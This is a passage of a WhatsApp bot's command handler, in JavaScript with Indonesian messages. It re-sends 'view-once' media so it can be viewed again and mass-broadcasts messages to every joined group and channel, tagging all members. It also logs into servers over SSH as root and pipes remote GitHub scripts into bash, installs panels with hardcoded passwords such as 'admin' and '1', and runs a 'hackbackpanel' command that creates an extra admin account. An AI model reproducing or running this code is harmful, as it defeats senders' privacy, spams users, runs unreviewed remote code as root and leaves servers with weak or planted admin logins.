  if (!m.quoted) return ReplyButton("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyButton("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyButton("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await client.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await client.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break;

case "tt": case "tiktok": {
if (!text) return ReplyButton(example("url"))
if (!text.startsWith("https://")) return ReplyButton(example("url"))
await tiktokDl(q).then(async (result) => {
await client.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return ReplyButton("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: client.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await client.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyButton(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyButton('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyButton('Failed to download media!');
    }

    const uploadImage = require('../system/Data1');
    const uploadFile = require('../system/Data2');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyButton('Failed to upload media!');
    }

    ReplyButton(`${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return ReplyButton(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await client.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyButton('max 10s');
    
    let media = await quoted.download();
    let encmedia = await client.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyButton(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break
case "joingc": case "join": {
if (!isCreator) return ReplyButton(mess.owner);
if (!q) return ReplyButton(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await client.groupAcceptInvite(result);
ReplyButton(`Berhasil bergabung ke grup ✅`)
}
//=================================================//
// Command Group
//=================================================//

break;
case 'hidetag': {
  if (!isCreator) return;
  if (!m.isGroup) return;

  const groupMetadata = await client.groupMetadata(from);
  const participants = groupMetadata.participants.map(p => p.id);

  const messageText = q ? q : 'Zoro Always Stay In Here';

  await client.sendMessage(from, {
    text: messageText,
    mentions: participants
  }, { quoted: null });
}
//=================================================//
// Command Jpm
//=================================================//

break

case "jpm": {
    if (!isCreator) return ReplyButton(mess.owner);
    if (!q) return ReplyButton(example("teksnya bisa dengan kirim foto juga"));

    // Inisialisasi aman
    if (!global.db) global.db = {};
    if (!global.db.groups) global.db.groups = {};

    let rest;
    if (/image/.test(mime)) {
        rest = await client.downloadAndSaveMediaMessage(qmsg);
    }

    const allgrup = await client.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const ttks = text;
    const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks };
    const opsijpm = rest !== undefined ? "teks & foto" : "teks";
    const jid = m.chat;

    await ReplyButton(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`);

    for (let i of res) {
        if (global.db.groups?.[i]?.blacklistjpm === true) continue;
        try {
            await client.sendMessage(i, pesancoy, { quoted: null });
            count++;
        } catch {}
        await sleep(3500);
    }

    if (rest !== undefined) await fs.unlinkSync(rest);
    await client.sendMessage(jid, { text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat` }, { quoted: m });
}
break;

case "jpmht": {
    if (!isCreator) return ReplyButton(mess.owner);
    if (!q) return ReplyButton(example("teksnya bisa dengan kirim foto juga"));

    // Inisialisasi aman
    if (!global.db) global.db = {};
    if (!global.db.groups) global.db.groups = {};

    let rest;
    if (/image/.test(mime)) {
        rest = await client.downloadAndSaveMediaMessage(qmsg);
    }

    const allgrup = await client.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const ttks = text;
    const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht";
    const jid = m.chat;

    await ReplyButton(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`);

    for (let i of res) {
        if (global.db.groups?.[i]?.blacklistjpm === true) continue;

        try {
            const ments = allgrup[i].participants.map(e => e.id);
            const pesancoy = rest !== undefined
                ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments }
                : { text: ttks, mentions: ments };

            await client.sendMessage(i, pesancoy, { quoted: null });
            count++;
        } catch (e) {
            console.error(`Gagal kirim ke ${i}:`, e.message);
        }

        await sleep(3500);
    }

    if (rest !== undefined) await fs.unlinkSync(rest);

    await client.sendMessage(jid, {
        text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`
    }, { quoted: m });
}
break;

case "addidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!text) return ReplyButton("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
        return ReplyButton("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return ReplyButton("Gagal mengekstrak ID dari link saluran!");

    try {
        let res = await client.newsletterMetadata("invite", channelId);

        if (!res.id) return ReplyButton("ID saluran tidak valid!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {
            return ReplyButton(`ID Saluran *${res.id}* sudah terdaftar!`);
        }

        global.channels.push(res.id);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
        console.error(e);
        ReplyButton("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
}
break;

case "delidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!text) return ReplyButton("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return ReplyButton("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return ReplyButton("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        ReplyButton(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break;

case "listidch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return ReplyButton("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    ReplyButton(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break
case "jpmch": {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!text && !m.quoted) return ReplyButton(example("Teksnya atau reply teks"));
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return ReplyButton(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    ReplyButton(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran tanpa penundaan
    await Promise.all(global.channels.map(async (id) => {
        try {
            await client.sendMessage(id, { text: teks }, { quoted: null });
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
    }));

    ReplyButton(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
`);
}
//=================================================//
// Command Install
//=================================================//

break

case "installpanel": {
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return ReplyButton(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "1"
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await client.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By RizxVelz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Nodes\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await ReplyButton("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return ReplyButton(mess.owner);
let t = text.split('|')
if (t.length < 2) return ReplyButton(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "rizxz"
const newpw = "1"

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await client.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "uninstallpanel": {
if (!isCreator) return ReplyButton(mess.owner);
if (!text || !text.split("|")) return ReplyButton(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return ReplyButton(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await ReplyButton("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ReplyButton("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
ReplyButton('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
ReplyButton('STDERR: ' + data);
});
});
}).on('error', (err) => {
ReplyButton('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

case "startwings": case "configurewings": {
let t = text.split('|')
if (t.length < 3) return ReplyButton(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyButton("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
ReplyButton('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "installtemastellar": case "installtemastelar": {
if (!isCreator) return ReplyButton(mess.owner);
if (global.installtema == undefined) return ReplyButton("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
ReplyButton("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyButton("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return ReplyButton(mess.owner);
if (global.installtema == undefined) return ReplyButton("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ReplyButton("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyButton("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return ReplyButton(mess.owner);
if (global.installtema == undefined) return ReplyButton("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ReplyButton("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyButton("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6289501955295\n');
stream.write('https://whatsapp.com/channel/0029VafXmrW6buMLxerpel2W\n');
stream.write('https://whatsapp.com/channel/0029VafXmrW6buMLxerpel2W\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstalltema": {
if (!isCreator) return ReplyButton(mess.owner);
if (!text || !text.split("|")) return ReplyButton(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ReplyButton(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await ReplyButton("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyButton("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyButton('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
//=================================================//
// Command Digital Ocean
//=================================================//

break

case 'listdroplet': {
    if (!isCreator) return ReplyButton(mess.owner);;
    try {
        const getDroplets = async () => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + global.apido
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                ReplyButton('Error fetching droplets: ' + err);
                return [];
            }
        };

        getDroplets().then(droplets => {
            let totalvps = droplets.length;
            let mesej = `List droplet DigitalOcean kamu: ${totalvps}\n\n`;

            if (droplets.length === 0) {
                mesej += 'Tidak ada droplet yang tersedia!';
            } else {
                droplets.forEach(droplet => {
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    
                    // Format tanggal pembuatan droplet
                    const createdAt = new Date(droplet.created_at).toLocaleString('id-ID', {
                        timeZone: 'Asia/Jakarta',
                        dateStyle: 'long',
                        timeStyle: 'short'
                    });

                    mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}
Tanggal Pembuatan: ${createdAt}\n\n`;
                });
            }
            client.sendMessage(m.chat, { text: mesej }, { quoted: m });
        });
    } catch (err) {
        ReplyButton('Terjadi kesalahan saat mengambil data droplet: ' + err);
    }
}
break;

case 'restartvps': {
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(`Example : *.${command}* iddroplet`)
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
ReplyButton(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
ReplyButton('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
ReplyButton(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
ReplyButton(err);
})

}
break

case 'rebuild': {
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(`Example : *.${command}* iddroplet`)
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
ReplyButton('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
client.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
ReplyButton('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
ReplyButton('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
ReplyButton('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case "deldroplet": {
if (!isCreator) return ReplyButton(mess.owner); 
if (!text) return ReplyButton(`Example : *.${command}* iddroplet`)
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
}
});

if (response.ok) {
ReplyButton('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
ReplyButton('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case "sisadroplet": {
if (!isCreator) return ReplyButton(mess.owner); 
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apido}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apido}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
